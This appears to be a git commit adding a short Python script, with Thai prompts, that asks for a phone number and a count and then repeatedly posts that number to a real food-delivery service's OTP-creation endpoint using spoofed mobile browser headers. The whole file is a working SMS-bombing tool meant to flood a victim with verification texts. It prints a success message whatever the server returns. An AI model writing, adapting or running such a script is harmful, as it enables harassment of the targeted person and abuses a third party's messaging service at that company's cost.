f0cefdcb8f2a94c04a895a6218a3cd64d0677adf
TiStKIller1 <87609154+TiStKIller1@users.noreply.github.com>
2022-02-21 19:07:08 +0700

    Add files via upload

---
+++ sms.py
@@ -0,0 +1,31 @@
+import requests,time
+
+print("""
+
+            ------------------
+            ------------------
+            ทำโดย อุลตร้า ok ไหม
+            ------------------
+            ------------------
+
+""")
+
+no = input('by อุลตร้า เบอร์: ')
+jml = int(input('จำนวน: '))
+
+heder = {'Host': 'api2.1112.com',
+'content-length': '44',
+'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36',
+'accept-language': 'th-TH,th;q=0.9,en;q=0.8',
+}
+        
+data = {"phonenumber": f"{no}","language":"th"}
+
+print("\n[กำลังยิง]")
+for i in range(jml):
+      sec = requests.post('https://api2.1112.com/api/v1/otp/create', headers=heder, json=data)
+      if 'eror' in sec.text:
+           print(f'{i+1}. [+]ยิงสำเร็จ {no}')
+      else:
+           print(f'{i+1}. [+]ยิงสำเร็จ {no}')
+      time.sleep(2.0)
